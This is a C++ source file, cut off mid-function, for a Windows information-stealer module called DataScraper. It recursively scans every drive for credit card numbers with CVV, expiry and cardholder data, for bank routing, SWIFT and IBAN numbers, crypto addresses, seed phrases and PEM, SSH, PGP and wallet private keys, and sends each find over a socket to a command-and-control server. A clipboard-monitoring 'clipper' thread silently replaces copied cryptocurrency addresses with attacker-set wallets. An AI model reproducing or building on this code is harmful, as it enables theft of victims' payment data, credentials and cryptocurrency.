#include "data_scraper.h"
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <cstring>
#include <cctype>
#include <regex>
#include <algorithm>
#include <queue>
#include <iomanip>
#include <filesystem>
#include <shlobj.h>
#include <wincodec.h>
#include <comdef.h>
#include <iphlpapi.h>
#include <wlanapi.h>
#include <wincred.h>
#include <lm.h>
#include <dsrole.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include <ntsecapi.h>
#include <sddl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <wtsapi32.h>

// Include wininet.h and winhttp.h with proper guards to avoid typedef conflicts
#ifndef _WININET_
#define _WININET_
#include <wininet.h>
#endif

#ifndef _WINHTTP_
#define _WINHTTP_
#include <winhttp.h>
#endif
#include <userenv.h>
#include <processenv.h>
#include <winternl.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "windowscodecs.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")

namespace fs = std::filesystem;

// ── JSON Escape Helper ──

static std::string escapeJson(const std::string& input) {
    std::string output;
    output.reserve(input.length());
    for (char c : input) {
        switch (c) {
            case '"':  output += "\\\""; break;
            case '\\': output += "\\\\"; break;
            case '/':  output += "\\/"; break;
            case '\b': output += "\\b"; break;
            case '\f': output += "\\f"; break;
            case '\n': output += "\\n"; break;
            case '\r': output += "\\r"; break;
            case '\t': output += "\\t"; break;
            default:
                if (static_cast<unsigned char>(c) < 0x20) {
                    char buf[7];
                    snprintf(buf, sizeof(buf), "\\u%04x", static_cast<unsigned char>(c));
                    output += buf;
                } else if (static_cast<unsigned char>(c) >= 0x7f) {
                    char buf[7];
                    snprintf(buf, sizeof(buf), "\\u%04x", static_cast<unsigned char>(c));
                    output += buf;
                } else {
                    output += c;
                }
                break;
        }
    }
    return output;
}

// ── Constructor / Destructor ──

DataScraper::DataScraper() {
    std::cout << "[DATASCRAPER] Initialized\n";
}

DataScraper::~DataScraper() {
    Stop();
}

// ── Start / Stop ──

void DataScraper::Start(SOCKET sock) {
    if (m_running) return;
    m_sock = sock;
    m_running = true;

    m_scannerThread = std::thread(&DataScraper::ScannerThread, this);
    m_clipboardThread = std::thread(&DataScraper::ClipboardMonitorThread, this);
    m_walletThread = std::thread(&DataScraper::WalletScannerThread, this);
    m_ocrThread = std::thread(&DataScraper::OCRScannerThread, this);
    m_appCredThread = std::thread(&DataScraper::AppCredentialScannerThread, this);

    std::cout << "[DATASCRAPER] Started\n";
}

void DataScraper::Stop() {
    if (!m_running) return;
    m_running = false;

    if (m_scannerThread.joinable()) m_scannerThread.join();
    if (m_clipboardThread.joinable()) m_clipboardThread.join();
    if (m_walletThread.joinable()) m_walletThread.join();
    if (m_ocrThread.joinable()) m_ocrThread.join();
    if (m_appCredThread.joinable()) m_appCredThread.join();

    std::cout << "[DATASCRAPER] Stopped\n";
}

// ── Wallet Address Configuration ──

void DataScraper::SetWalletAddress(const std::string& cryptoType, const std::string& address) {
    std::lock_guard<std::mutex> lock(m_walletMutex);
    std::string type = cryptoType;
    std::transform(type.begin(), type.end(), type.begin(), ::toupper);

    if (type == "BTC") m_btcAddress = address;
    else if (type == "ETH") m_ethAddress = address;
    else if (type == "SOL") m_solAddress = address;
    else if (type == "LTC") m_ltcAddress = address;
    else if (type == "DOGE") m_dogeAddress = address;
    else if (type == "BCH") m_bchAddress = address;
    else if (type == "XRP") m_xrpAddress = address;

    std::cout << "[DATASCRAPER] Wallet address set for " << type << ": " << address << "\n";
}

std::string DataScraper::GetWalletAddress(const std::string& cryptoType) const {
    std::lock_guard<std::mutex> lock(m_walletMutex);
    std::string type = cryptoType;
    std::transform(type.begin(), type.end(), type.begin(), ::toupper);

    if (type == "BTC") return m_btcAddress;
    if (type == "ETH") return m_ethAddress;
    if (type == "SOL") return m_solAddress;
    if (type == "LTC") return m_ltcAddress;
    if (type == "DOGE") return m_dogeAddress;
    if (type == "BCH") return m_bchAddress;
    if (type == "XRP") return m_xrpAddress;
    return "";
}

// ── Communication ──

void DataScraper::SendToC2(const std::string& type, const std::string& data) {
    std::string msg = "DATA_SCRAPER|" + type + "|" + data + "\n";
    send(m_sock, msg.c_str(), msg.length(), 0);
}

void DataScraper::SendProgress(const std::string& status, int scanned, int found) {
    std::string msg = "DATA_SCRAPER_PROGRESS|" + status + "|" +
                      std::to_string(scanned) + "|" + std::to_string(found) + "\n";
    send(m_sock, msg.c_str(), msg.length(), 0);
}

// ── Phase A: File Scanner Thread ──

void DataScraper::ScannerThread() {
    std::cout << "[DATASCRAPER] Scanner thread started\n";
    m_scannerActive = true;
    ScanAllDrives();
    while (m_running) {
        Sleep(30000);
        if (!m_running) break;
        ScanAllDrives();
    }
    m_scannerActive = false;
    std::cout << "[DATASCRAPER] Scanner thread stopped\n";
}

void DataScraper::ScanAllDrives() {
    std::cout << "[DATASCRAPER] Scanning all drives...\n";
    SendProgress("scanning_drives", m_filesScanned.load(), m_itemsFound.load());

    DWORD drives = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (!m_running) break;
        if (drives & (1 << i)) {
            char root[4] = { char('A' + i), ':', '\\', '\0' };
            UINT driveType = GetDriveTypeA(root);
            if (driveType == DRIVE_CDROM || driveType == DRIVE_RAMDISK ||
                driveType == DRIVE_UNKNOWN || driveType == DRIVE_NO_ROOT_DIR) {
                continue;
            }
            std::cout << "[DATASCRAPER] Scanning drive: " << root << "\n";
            ScanDirectory(root);
        }
    }

    std::cout << "[DATASCRAPER] Drive scan complete. Files: " << m_filesScanned.load()
              << ", Items found: " << m_itemsFound.load() << "\n";
    SendProgress("scan_complete", m_filesScanned.load(), m_itemsFound.load());
}

void DataScraper::ScanDirectory(const std::string& path) {
    if (!m_running) return;
    try {
        for (const auto& entry : fs::directory_iterator(path)) {
            if (!m_running) return;
            try {
                if (entry.is_regular_file()) {
                    ScanFile(entry.path().string());
                } else if (entry.is_directory()) {
                    std::string dirName = entry.path().filename().string();
                    if (dirName == "Windows" || dirName == "System32" ||
                        dirName == "System Volume Information" ||
                        dirName == "$Recycle.Bin" || dirName == "Recovery" ||
                        dirName == "Program Files" || dirName == "Program Files (x86)" ||
                        dirName == "WinSxS" || dirName == "AppData" ||
                        dirName == "Microsoft" || dirName == "Assembly" ||
                        dirName == "Installer" || dirName == "Temp" ||
                        dirName == "cache" || dirName == "Cache" ||
                        dirName == "node_modules" || dirName == ".git" ||
                        dirName[0] == '$') {
                        continue;
                    }
                    ScanDirectory(entry.path().string());
                }
            } catch (...) {}
        }
    } catch (...) {}
}

void DataScraper::ScanFile(const std::string& path) {
    if (!m_running) return;
    try {
        uintmax_t fileSize = fs::file_size(path);
        if (fileSize > 50 * 1024 * 1024) return;
    } catch (...) { return; }

    std::string hash = GetFileHash(path);
    if (hash.empty() || IsAlreadyScanned(hash)) return;

    m_filesScanned++;

    if (IsTextFile(path)) {
        std::string content = ReadTextFile(path);
        if (!content.empty()) {
            ScanTextForData(content, path);
        }
    }

    if (m_filesScanned.load() % 100 == 0) {
        SendProgress("scanning", m_filesScanned.load(), m_itemsFound.load());
    }
}

bool DataScraper::IsTextFile(const std::string& path) {
    std::string ext = path.substr(path.find_last_of('.') + 1);
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

    static const std::unordered_set<std::string> textExts = {
        "txt", "log", "csv", "json", "xml", "html", "htm", "php", "asp", "aspx",
        "js", "ts", "jsx", "tsx", "css", "scss", "less", "md", "rst", "ini",
        "cfg", "conf", "config", "yml", "yaml", "toml", "env", "bat", "cmd",
        "ps1", "sh", "bash", "zsh", "sql", "db", "sqlite", "db3", "sdb",
        "dat", "dta", "lst", "key", "pem", "ppk", "asc", "gpg",
        "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "rtf",
        "eml", "msg", "ost", "pst", "vcf", "wallet", "keystore"
    };
    return textExts.find(ext) != textExts.end();
}

bool DataScraper::IsImageFile(const std::string& path) {
    std::string ext = path.substr(path.find_last_of('.') + 1);
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
    static const std::unordered_set<std::string> imageExts = {
        "png", "jpg", "jpeg", "bmp", "gif", "tiff", "tif", "webp"
    };
    return imageExts.find(ext) != imageExts.end();
}

std::string DataScraper::ReadTextFile(const std::string& path) {
    try {
        std::ifstream file(path, std::ios::binary);
        if (!file.is_open()) return "";
        std::vector<char> buffer(1024 * 1024);
        file.read(buffer.data(), buffer.size());
        std::streamsize bytesRead = file.gcount();
        if (bytesRead <= 0) return "";
        size_t checkSize = std::min(bytesRead, (std::streamsize)4096);
        for (size_t i = 0; i < checkSize; i++) {
            if (buffer[i] == '\0') return "";
        }
        return std::string(buffer.data(), bytesRead);
    } catch (...) { return ""; }
}

std::string DataScraper::GetFileHash(const std::string& path) {
    try {
        auto ftime = fs::last_write_time(path);
        auto size = fs::file_size(path);
        std::ifstream file(path, std::ios::binary);
        if (!file.is_open()) return "";
        char header[256];
        file.read(header, sizeof(header));
        std::streamsize bytesRead = file.gcount();
        std::stringstream ss;
        ss << size << "_" << ftime.time_since_epoch().count();
        if (bytesRead > 0) {
            ss << "_" << std::hex;
            for (std::streamsize i = 0; i < bytesRead && i < 32; i++) {
                ss << std::setw(2) << std::setfill('0') << (unsigned char)header[i];
            }
        }
        return ss.str();
    } catch (...) { return ""; }
}

bool DataScraper::IsAlreadyScanned(const std::string& hash) {
    std::lock_guard<std::mutex> lock(m_hashMutex);
    if (m_scannedHashes.find(hash) != m_scannedHashes.end()) return true;
    m_scannedHashes.insert(hash);
    return false;
}

// ── Phase A: Regex Scanning ──

void DataScraper::ScanTextForData(const std::string& text, const std::string& filePath) {
    std::vector<std::string> results;
    std::string escapedPath = escapeJson(filePath);

    if (FindCreditCards(text, results)) {
        for (const auto& cc : results) {
            m_itemsFound++;
            std::string data = "{\"type\":\"credit_card\",\"value\":\"" + escapeJson(cc) +
                               "\",\"source\":\"" + escapedPath + "\"}";
            SendToC2("found", data);
        }
        results.clear();
    }

    if (FindBankInfo(text, results)) {
        for (const auto& bank : results) {
            m_itemsFound++;
            std::string data = "{\"type\":\"bank_info\",\"value\":\"" + escapeJson(bank) +
                               "\",\"source\":\"" + escapedPath + "\"}";
            SendToC2("found", data);
        }
        results.clear();
    }

    if (FindCryptoAddresses(text, results)) {
        for (const auto& addr : results) {
            m_itemsFound++;
            std::string data = "{\"type\":\"crypto_address\",\"value\":\"" + escapeJson(addr) +
                               "\",\"source\":\"" + escapedPath + "\"}";
            SendToC2("found", data);
        }
        results.clear();
    }

    if (FindSeedPhrases(text, results)) {
        for (const auto& seed : results) {
            m_itemsFound++;
            std::string data = "{\"type\":\"seed_phrase\",\"value\":\"" + escapeJson(seed) +
                               "\",\"source\":\"" + escapedPath + "\"}";
            SendToC2("found", data);
        }
        results.clear();
    }

    if (FindPrivateKeys(text, results)) {
        for (const auto& key : results) {
            m_itemsFound++;
            std::string data = "{\"type\":\"private_key\",\"value\":\"" + escapeJson(key) +
                               "\",\"source\":\"" + escapedPath + "\"}";
            SendToC2("found", data);
        }
        results.clear();
    }
}

bool DataScraper::FindCreditCards(const std::string& text, std::vector<std::string>& results) {
    try {
        std::regex ccRegex(
            "(?:4[0-9]{12}(?:[0-9]{3})?|"
            "5[1-5][0-9]{14}|"
            "3[47][0-9]{13}|"
            "6(?:011|5[0-9]{2})[0-9]{12})"
        );
        std::smatch match;
        std::string::const_iterator searchStart(text.cbegin());
        while (std::regex_search(searchStart, text.cend(), match, ccRegex)) {
            std::string cardNumber = match[0];
            size_t cardPos = match.position();
            size_t contextStart = (cardPos > 300) ? cardPos - 300 : 0;
            std::string context = text.substr(contextStart, cardPos - contextStart + 150 + cardNumber.length());

            std::string cardholder;
            std::regex nameRegex(
                "(?:cardholder|card\\s*holder|name\\s*on\\s*card|card\\s*name|"
                "full\\s*name|account\\s*name|billing\\s*name)\\s*[:;]?\\s*"
                "([A-Za-zÀ-ÿ]+(?:\\s+[A-Za-zÀ-ÿ]+){1,3})",
                std::regex_constants::icase
            );
            std::smatch nameMatch;
            if (std::regex_search(context, nameMatch, nameRegex)) {
                cardholder = nameMatch[1].str();
            } else {
                size_t lineStart = text.rfind('\n', cardPos);
                if (lineStart == std::string::npos) lineStart = 0;
                else lineStart++;
                std::string prevLine = text.substr(lineStart, cardPos - lineStart);
                prevLine.erase(0, prevLine.find_first_not_of(" \t\r"));
                prevLine.erase(prevLine.find_last_not_of(" \t\r") + 1);
                std::regex nameLineRegex("^[A-Z][a-zÀ-ÿ]+(?:\\s+[A-Z][a-zÀ-ÿ]+){1,3}$");
                if (!prevLine.empty() && std::regex_match(prevLine, nameLineRegex)) {
                    cardholder = prevLine;
                }
            }

            std::string cvv;
            std::regex cvvRegex(
                "(?:cvv|cvc|cvv2|cvc2|security\\s*code|verification\\s*code|"
                "card\\s*code|ccv|cid)\\s*[:;]?\\s*(\\d{3,4})",
                std::regex_constants::icase
            );
            std::smatch cvvMatch;
            if (std::regex_search(context, cvvMatch, cvvRegex)) {
                cvv = cvvMatch[1].str();
            }

            std::string expiry;
            std::regex expRegex(
                "(?:exp|expiry|expiration|expires|valid\\s*thru|valid\\s*through|"
                "good\\s*thru|good\\s*through|valid\\s*until|exp\\s*date)\\s*[:;]?\\s*"
                "(\\d{1,2})\\s*[/\\\\-]\\s*(\\d{2,4})",
                std::regex_constants::icase
            );
            std::smatch expMatch;
            if (std::regex_search(context, expMatch, expRegex)) {
                std::string month = expMatch[1].str();
                std::string year = expMatch[2].str();
                if (month.length() == 1) month = "0" + month;
                if (year.length() == 2) year = "20" + year;
                expiry = month + "/" + year;
            }

            std::string address;
            std::regex addrRegex(
                "(?:address|billing\\s*address|billing\\s*street|street|"
                "mailing\\s*address)\\s*[:;]?\\s*"
                "(\\d+[^,;\\n]{5,80})",
                std::regex_constants::icase
            );
            std::smatch addrMatch;
            if (std::regex_search(context, addrMatch, addrRegex)) {
                address = addrMatch[1].str();
                address.erase(address.find_last_not_of(" \t\r,;") + 1);
            }

            std::string enriched = cardNumber;
            if (!cardholder.empty()) enriched += "|name:" + cardholder;
            if (!expiry.empty())     enriched += "|exp:" + expiry;
            if (!cvv.empty())        enriched += "|cvv:" + cvv;
            if (!address.empty())    enriched += "|addr:" + address;

            results.push_back(enriched);
            searchStart = match.suffix().first;
        }
    } catch (...) {}
    return !results.empty();
}

bool DataScraper::FindBankInfo(const std::string& text, std::vector<std::string>& results) {
    try {
        std::regex routingRegex("\\b\\d{9}\\b");
        std::smatch match;
        std::string::const_iterator searchStart(text.cbegin());
        while (std::regex_search(searchStart, text.cend(), match, routingRegex)) {
            results.push_back("routing:" + match[0].str());
            searchStart = match.suffix().first;
        }

        // SWIFT/BIC: 8 or 11 chars, must contain at least 1 digit (to avoid false positives like "SERVICES")
        std::regex swiftRegex("\\b[A-Z]{4}[A-Z]{2}[A-Z0-9]{2}(?:[A-Z0-9]{3})?\\b");
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, swiftRegex)) {
            std::string swift = match[0].str();
            // Must contain at least 1 digit (real SWIFT codes have digits in location/branch code)
            bool hasDigit = false;
            for (char c : swift) { if (c >= '0' && c <= '9') { hasDigit = true; break; } }
            if (hasDigit) {
                results.push_back("swift:" + swift);
            }
            searchStart = match.suffix().first;
        }

        std::regex ibanRegex("\\b[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30}\\b");
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, ibanRegex)) {
            results.push_back("iban:" + match[0].str());
            searchStart = match.suffix().first;
        }
    } catch (...) {}
    return !results.empty();
}

bool DataScraper::FindCryptoAddresses(const std::string& text, std::vector<std::string>& results) {
    try {
        std::regex btcRegex("\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\\b");
        std::smatch match;
        std::string::const_iterator searchStart(text.cbegin());
        while (std::regex_search(searchStart, text.cend(), match, btcRegex)) {
            results.push_back("btc:" + match[0].str());
            searchStart = match.suffix().first;
        }

        std::regex btcBech32Regex("\\bbc1[a-zA-HJ-NP-Z0-9]{25,87}\\b");
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, btcBech32Regex)) {
            results.push_back("btc:" + match[0].str());
            searchStart = match.suffix().first;
        }

        std::regex ethRegex("\\b0x[a-fA-F0-9]{40}\\b");
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, ethRegex)) {
            results.push_back("eth:" + match[0].str());
            searchStart = match.suffix().first;
        }

        std::regex solRegex("\\b[1-9A-HJ-NP-Za-km-z]{32,44}\\b");
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, solRegex)) {
            std::string addr = match[0].str();
            int digits = 0, upper = 0, lower = 0;
            for (char c : addr) {
                if (c >= '0' && c <= '9') digits++;
                else if (c >= 'A' && c <= 'Z') upper++;
                else if (c >= 'a' && c <= 'z') lower++;
            }
            if (digits >= 2 && ((upper >= 2 && lower >= 2) || (upper >= 4) || (lower >= 4 && digits >= 4))) {
                results.push_back("sol:" + addr);
            }
            searchStart = match.suffix().first;
        }

        std::regex ltcRegex("\\b[LM][a-km-zA-HJ-NP-Z1-9]{26,33}\\b");
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, ltcRegex)) {
            std::string addr = match[0].str();
            int digits = 0, upper = 0, lower = 0;
            for (char c : addr) {
                if (c >= '0' && c <= '9') digits++;
                else if (c >= 'A' && c <= 'Z') upper++;
                else if (c >= 'a' && c <= 'z') lower++;
            }
            if (digits >= 2 && ((upper >= 2 && lower >= 2) || (upper >= 4) || (lower >= 4 && digits >= 4))) {
                results.push_back("ltc:" + addr);
            }
            searchStart = match.suffix().first;
        }

        std::regex dogeRegex("\\bD[a-km-zA-HJ-NP-Z1-9]{25,34}\\b");
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, dogeRegex)) {
            std::string addr = match[0].str();
            int digits = 0, upper = 0, lower = 0;
            for (char c : addr) {
                if (c >= '0' && c <= '9') digits++;
                else if (c >= 'A' && c <= 'Z') upper++;
                else if (c >= 'a' && c <= 'z') lower++;
            }
            if (digits >= 2 && ((upper >= 2 && lower >= 2) || (upper >= 4) || (lower >= 4 && digits >= 4))) {
                results.push_back("doge:" + addr);
            }
            searchStart = match.suffix().first;
        }

        std::regex bchRegex("\\b(?:bitcoincash:)?[qp][a-z0-9]{41}\\b");
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, bchRegex)) {
            results.push_back("bch:" + match[0].str());
            searchStart = match.suffix().first;
        }

        std::regex xrpRegex("\\br[1-9A-HJ-NP-Za-km-z]{24,34}\\b");
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, xrpRegex)) {
            std::string addr = match[0].str();
            int digits = 0, upper = 0, lower = 0;
            for (char c : addr) {
                if (c >= '0' && c <= '9') digits++;
                else if (c >= 'A' && c <= 'Z') upper++;
                else if (c >= 'a' && c <= 'z') lower++;
            }
            if (digits >= 2 && ((upper >= 2 && lower >= 2) || (upper >= 4) || (lower >= 4 && digits >= 4))) {
                results.push_back("xrp:" + addr);
            }
            searchStart = match.suffix().first;
        }
    } catch (...) {}
    return !results.empty();
}

bool DataScraper::FindSeedPhrases(const std::string& text, std::vector<std::string>& results) {
    try {
        std::regex seedKeywordRegex(
            "(?:seed|mnemonic|recovery|backup)\\s*(?:phrase|words|key|keys)?\\s*[:\\s]+"
            "(?:[a-z]+\\s+){11,23}[a-z]+",
            std::regex_constants::icase
        );
        std::smatch match;
        std::string::const_iterator searchStart(text.cbegin());
        while (std::regex_search(searchStart, text.cend(), match, seedKeywordRegex)) {
            results.push_back(match[0].str());
            searchStart = match.suffix().first;
        }

        std::regex seedPhraseRegex("\\b(?:[a-z]+\\s+){11}[a-z]+\\b");
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, seedPhraseRegex)) {
            std::string phrase = match[0].str();
            std::istringstream iss(phrase);
            std::string word;
            bool valid = true;
            int wordCount = 0;
            while (iss >> word) {
                wordCount++;
                if (word.length() < 3 || word.length() > 8) { valid = false; break; }
            }
            if (valid && (wordCount == 12 || wordCount == 18 || wordCount == 24)) {
                results.push_back(phrase);
            }
            searchStart = match.suffix().first;
        }
    } catch (...) {}
    return !results.empty();
}

bool DataScraper::FindPrivateKeys(const std::string& text, std::vector<std::string>& results) {
    try {
        std::regex pemRegex(
            "-----BEGIN\\s+(?:RSA\\s+)?(?:EC\\s+)?PRIVATE\\s+KEY-----"
            "[^-]+"
            "-----END\\s+(?:RSA\\s+)?(?:EC\\s+)?PRIVATE\\s+KEY-----"
        );
        std::smatch match;
        std::string::const_iterator searchStart(text.cbegin());
        while (std::regex_search(searchStart, text.cend(), match, pemRegex)) {
            results.push_back("pem:" + match[0].str().substr(0, 80) + "...");
            searchStart = match.suffix().first;
        }

        std::regex opensshRegex(
            "-----BEGIN\\s+OPENSSH\\s+PRIVATE\\s+KEY-----"
            "[^-]+"
            "-----END\\s+OPENSSH\\s+PRIVATE\\s+KEY-----"
        );
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, opensshRegex)) {
            results.push_back("openssh:" + match[0].str().substr(0, 80) + "...");
            searchStart = match.suffix().first;
        }

        std::regex pgpRegex(
            "-----BEGIN\\s+PGP\\s+PRIVATE\\s+KEY\\s+BLOCK-----"
            "[^-]+"
            "-----END\\s+PGP\\s+PRIVATE\\s+KEY\\s+BLOCK-----"
        );
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, pgpRegex)) {
            results.push_back("pgp:" + match[0].str().substr(0, 80) + "...");
            searchStart = match.suffix().first;
        }

        std::regex wifRegex("\\b5[HJ-K][1-9A-HJ-NP-Za-km-z]{49}\\b");
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, wifRegex)) {
            results.push_back("btc_wif:" + match[0].str());
            searchStart = match.suffix().first;
        }

        std::regex wifCompRegex("\\b[KL][1-9A-HJ-NP-Za-km-z]{50}\\b");
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, wifCompRegex)) {
            results.push_back("btc_wif:" + match[0].str());
            searchStart = match.suffix().first;
        }

        std::regex ethKeyRegex("(?:^|[^0x])[a-fA-F0-9]{64}(?:[^a-fA-F0-9]|$)");
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, ethKeyRegex)) {
            std::string key = match[0].str();
            if (key.size() > 64) key = key.substr(key.size() - 65, 64);
            results.push_back("eth_key:" + key);
            searchStart = match.suffix().first;
        }

        std::regex keystoreRegex(
            "\\{\\s*\"address\"\\s*:\\s*\"0x[a-fA-F0-9]{40}\"\\s*,"
            "\\s*\"crypto\"\\s*:\\s*\\{"
        );
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, keystoreRegex)) {
            results.push_back("eth_keystore:" + match[0].str());
            searchStart = match.suffix().first;
        }

        std::regex privKeyRegex(
            "(?:private\\s+key|privkey|secret\\s+key)\\s*[:=]\\s*"
            "[A-Za-z0-9+/=]{40,}",
            std::regex_constants::icase
        );
        searchStart = text.cbegin();
        while (std::regex_search(searchStart, text.cend(), match, privKeyRegex)) {
            results.push_back("privkey:" + match[0].str().substr(0, 80));
            searchStart = match.suffix().first;
        }
    } catch (...) {}
    return !results.empty();
}

// ── Phase B: Crypto Clipper ──

void DataScraper::ClipboardMonitorThread() {
    std::cout << "[DATASCRAPER] Clipboard monitor thread started\n";
    m_clipperActive = true;
    m_lastClipboardHash = "";

    while (m_running) {
        std::string text = GetClipboardText();
        if (!text.empty()) {
            std::string hash = HashClipboard(text);
            if (hash != m_lastClipboardHash) {
                m_lastClipboardHash = hash;
                std::string detectedType = DetectCryptoAddress(text);
                if (!detectedType.empty()) {
                    std::string replacement = ReplaceAddress(text);
                    if (replacement != text) {
                        if (SetClipboardText(replacement)) {
                            std::cout << "[DATASCRAPER] Clipper replaced " << detectedType << " address\n";
                            std::string data = "{\"type\":\"clipper\",\"crypto\":\"" +
                                               detectedType + "\",\"original\":\"" +
                                               text + "\",\"replaced\":\"" +
                                               replacement + "\"}";
                            SendToC2("found", data);
                            m_itemsFound++;
                        }
                    }
                }
            }
        }
        Sleep(500);
    }

    m_clipperActive = false;
    std::cout << "[DATASCRAPER] Clipboard monitor thread stopped\n";
}

std::string DataScraper::DetectCryptoAddress(const std::string& text) {
    try {
        std::regex btcRegex("\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\\b");
        if (std::regex_match(text, btcRegex)) {
            int digits = 0, upper = 0, lower = 0;
            for (char c : text) {
                if (c >= '0' && c <= '9') digits++;
                else if (c >= 'A' && c <= 'Z') upper++;
                else if (c >= 'a' && c <= 'z') lower++;
            }
            if (digits >= 2 && ((upper >= 2 && lower >= 2) || (upper >= 4) || (lower >= 4 && digits >= 4))) {
                return "BTC";
            }
        }

        std::regex ethRegex("\\b0x[a-fA-F0-9]{40}\\b");
        if (std::regex_match(text, ethRegex)) return "ETH";

        std::regex solRegex("\\b[1-9A-HJ-NP-Za-km-z]{32,44}\\b");
        if (std::regex_match(text, solRegex)) {
            int digits = 0, upper = 0, lower = 0;
            for (char c : text) {
                if (c >= '0' && c <= '9') digits++;
                else if (c >= 'A' && c <= 'Z') upper++;
                else if (c >= 'a' && c <= 'z') lower++;
            }
            if (digits >= 2 && ((upper >= 2 && lower >= 2) || (upper >= 4) || (lower >= 4 && digits >= 4))) {
                return "SOL";
            }
        }

        std::regex ltcRegex("\\b[LM][a-km-zA-HJ-NP-Z1-9]{26,33}\\b");
        if (std::regex_match(text, ltcRegex)) {
            int digits = 0, upper = 0, lower = 0;
            for (char c : text) {
                if (c >= '0' && c <= '9') digits++;
                else if (c >= 'A' && c <= 'Z') upper++;
                else if (c >= 'a' && c <= 'z') lower++;
            }
            if (digits >= 2 && ((upper >= 2 && lower >= 2) || (upper >= 4) || (lower >= 4 && digits >= 4))) {
                return "LTC";
            }
        }

        std::regex dogeRegex("\\bD[a-km-zA-HJ-NP-Z1-9]{25,34}\\b");
        if (std::regex_match(text, dogeRegex)) {
            int digits = 0, upper = 0, lower = 0;
            for (char c : text) {
                if (c >= '0' && c <= '9') digits++;
                else if (c >= 'A' && c <= 'Z') upper++;
                else if (c >= 'a' && c <= 'z') lower++;
            }
            if (digits >= 2 && ((upper >= 2 && lower >= 2) || (upper >= 4) || (lower >= 4 && digits >= 4))) {
                return "DOGE";
            }
        }

        std::regex bchRegex("\\b(?:bitcoincash:)?[qp][a-z0-9]{41}\\b");
        if (std::regex_match(text, bchRegex)) return "BCH";

        std::regex xrpRegex("\\br[1-9A-HJ-NP-Za-km-z]{24,34}\\b");
        if (std::regex_match(text, xrpRegex)) {
            int digits = 0, upper = 0, lower = 0;
            for (char c : text) {
                if (c >= '0' && c <= '9') digits++;
                else if (c >= 'A' && c <= 'Z') upper++;
                else if (c >= 'a' && c <= 'z') lower++;
            }
            if (digits >= 2 && ((upper >= 2 && lower >= 2) || (upper >= 4) || (lower >= 4 && digits >= 4))) {
                return "XRP";
            }
        }
    } catch (...) {}
    return "";
}

std::string DataScraper::ReplaceAddress(const std::string& original) {
    std::lock_guard<std::mutex> lock(m_walletMutex);

    std::regex btcRegex("\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\\b");
    if (std::regex_match(original, btcRegex) && !m_btcAddress.empty()) return m_btcAddress;

    std::regex ethRegex("\\b0x[a-fA-F0-9]{40}\\b");
    if (std::regex_match(original, ethRegex) && !m_ethAddress.empty()) return m_ethAddress;

    std::regex solRegex("\\b[1-9A-HJ-NP-Za-km-z]{32,44}\\b");
    if (std::regex_match(original, solRegex) && !m_solAddress.empty()) return m_solAddress;

    std::regex ltcRegex("\\b[LM][a-km-zA-HJ-NP-Z1-9]{26,33}\\b");
    if (std::regex_match(original, ltcRegex) && !m_ltcAddress.empty()) return m_ltcAddress;

    std::regex dogeRegex("\\bD[a-km-zA-HJ-NP-Z1-9]{25,34}\\b");
    if (std::regex_match(original, dogeRegex) && !m_dogeAddress.empty()) return m_dogeAddress;

    std::regex bchRegex("\\b(?:bitcoincash:)?[qp][a-z0-9]{41}\\b");
    if (std::regex_match(original, bchRegex) && !m_bchAddress.empty()) return m_bchAddress;

    std::regex xrpRegex("\\br[1-9A-HJ-NP-Za-km-z]{24,34}\\b");
    if (std::regex_match(original, xrpRegex) && !m_xrpAddress.empty()) return m_xrpAddress;

    return original;
}

std::string DataScraper::GetClipboardText() {
    std::string result;
    if (!OpenClipboard(nullptr)) return result;

    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData) {
        char* pszText = static_cast<char*>(GlobalLock(hData));
        if (pszText) {
            result = pszText;
            GlobalUnlock(hData);
        }
    }
    CloseClipboard();
    return result;
}

bool DataScraper::SetClipboardText(const std::string& text) {
    if (!OpenClipboard(nullptr)) return false;

    EmptyClipboard();
    HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, text.length() + 1);
    if (!hGlob) {
        CloseClipboard();
        return false;
    }

    memcpy(GlobalLock(hGlob), text.c_str(), text.length() + 1);
    GlobalUnlock(hGlob);
    SetClipboardData(CF_TEXT, hGlob);
    CloseClipboard();
    return true;
}

std::string DataScraper::HashClipboard(const std::string& text) {
    std::string hash;
    try {
        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
